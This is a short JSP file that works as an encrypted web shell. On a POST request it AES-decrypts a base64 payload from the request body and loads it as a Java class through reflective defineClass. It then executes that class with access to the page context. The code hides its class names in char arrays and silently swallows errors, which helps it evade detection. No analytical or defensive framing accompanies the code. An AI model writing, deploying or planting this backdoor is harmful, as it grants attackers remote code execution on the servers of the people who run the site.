<%@ page import="java.lang.reflect.Method" %>
<%
    /**
     */
    try {
        if ("POST".equals(request.getMethod())) {
            String k = "e45e329feb5d925b";
            session.putValue("u", k);

            String strAes = new String(new char[]{'A', 'E', 'S'});
            String strCipher = new String(new char[]{'j', 'a', 'v', 'a', 'x', '.', 'c', 'r', 'y', 'p', 't', 'o', '.', 'C', 'i', 'p', 'h', 'e', 'r'});
            String strKeySpec = new String(new char[]{'j', 'a', 'v', 'a', 'x', '.', 'c', 'r', 'y', 'p', 't', 'o', '.', 's', 'p', 'e', 'c', '.', 'S', 'e', 'c', 'r', 'e', 't', 'K', 'e', 'y', 'S', 'p', 'e', 'c'});
            String strDef = new String(new char[]{'d', 'e', 'f', 'i', 'n', 'e', 'C', 'l', 'a', 's', 's'});

            Class<?> cipherCls = Class.forName(strCipher);
            Object cipher = cipherCls.getMethod("getInstance", String.class).invoke(null, strAes);
            Class<?> keySpecCls = Class.forName(strKeySpec);
            Object keySpec = keySpecCls.getConstructor(byte[].class, String.class).newInstance(k.getBytes(), strAes);
            cipherCls.getMethod("init", int.class, java.security.Key.class).invoke(cipher, 2, keySpec);

            String b64Str = request.getReader().readLine();
            byte[] encBytes = null;

            try {

                String strB64New = new String(new char[]{'j', 'a', 'v', 'a', '.', 'u', 't', 'i', 'l', '.', 'B', 'a', 's', 'e', '6', '4'});
                Class<?> b64Cls = Class.forName(strB64New);
                Object decoder = b64Cls.getMethod("getDecoder").invoke(null);
                encBytes = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, b64Str);
            } catch (Throwable e) {
                String strB64Old = new String(new char[]{'s', 'u', 'n', '.', 'm', 'i', 's', 'c', '.', 'B', 'A', 'S', 'E', '6', '4', 'D', 'e', 'c', 'o', 'd', 'e', 'r'});
                Class<?> b64Cls = Class.forName(strB64Old);
                Object decoder = b64Cls.newInstance();
                encBytes = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, b64Str);
            }

            if (encBytes != null) {
                byte[] decBytes = (byte[]) cipherCls.getMethod("doFinal", byte[].class).invoke(cipher, encBytes);
                java.net.URLClassLoader ucl = new java.net.URLClassLoader(new java.net.URL[0], this.getClass().getClassLoader());
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod(strDef, byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                
                Class<?> payloadClass = (Class<?>) defineClassMethod.invoke(ucl, decBytes, 0, decBytes.length);
                payloadClass.newInstance().equals(pageContext);
            }
        }
    } catch (Exception e) {
    }
%>